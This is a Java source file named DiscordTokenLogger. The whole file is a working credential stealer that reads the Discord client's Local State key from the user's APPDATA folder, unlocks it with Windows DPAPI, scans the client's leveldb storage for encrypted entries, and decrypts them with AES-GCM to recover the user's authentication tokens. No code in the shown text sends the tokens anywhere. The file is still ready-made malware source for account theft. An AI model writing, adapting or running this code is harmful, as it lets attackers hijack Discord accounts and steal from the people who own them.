import com.sun.jna.platform.win32.Crypt32Util;
import org.json.JSONObject;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.util.Arrays;
import java.util.Base64;
import java.util.LinkedList;
import java.util.List;

public class DiscordTokenLogger {
    public static List<String> getTokens() {
        String key = Key();
        List<String> token = Tokens();
        if(key == null) return null;
        LinkedList<String> tokens = new LinkedList<>();
        for(String s : token) {
            try {
                byte[] z = Base64.getDecoder().decode(key);
                byte[] y = Arrays.copyOfRange(z, 5, z.length);
                tokens.add(decrypt(Base64.getDecoder().decode(s), y));
            } catch (Exception ignored) {}
        }
        return tokens;
    }


    private static List<String> Tokens() {
        LinkedList<String> token = new LinkedList<>();
        String regex = "dQw4w9WgXcQ:";
        File[] files = new File(System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb\\").listFiles();
        assert files != null;
        for (File file : files) {
            try {
                try (BufferedReader br = new BufferedReader(new FileReader(file))) {
                    String line;
                    while ((line = br.readLine()) != null) if (line.contains(regex)) token.add(line.split(regex)[1].split("\"")[0]);
                }
            } catch (Exception ignored) {}
        }
        return token;
    }

    private static String Key() {
        try {
            try (BufferedReader brs = new BufferedReader(new FileReader(System.getenv("APPDATA") + "\\discord\\Local State"))) {
                String line;
                while ((line = brs.readLine()) != null) {
                    return new JSONObject(line).getJSONObject("os_crypt").getString("encrypted_key");
                }
            }
        } catch (Exception ignored) {}
        return null;
    }

    private static String decrypt(byte[] token, byte[] key) throws Exception {
        byte[] finalKey = Crypt32Util.cryptUnprotectData(key);
        byte[] finaltoken = new byte[12];
        System.arraycopy(token, 3, finaltoken, 0, 12);
        byte[] data = new byte[token.length - 15];
        System.arraycopy(token, 15, data, 0, data.length);
        Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
        cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(finalKey, "AES"), new GCMParameterSpec(128, finaltoken));
        return new String(cipher.doFinal(data));
    }
}
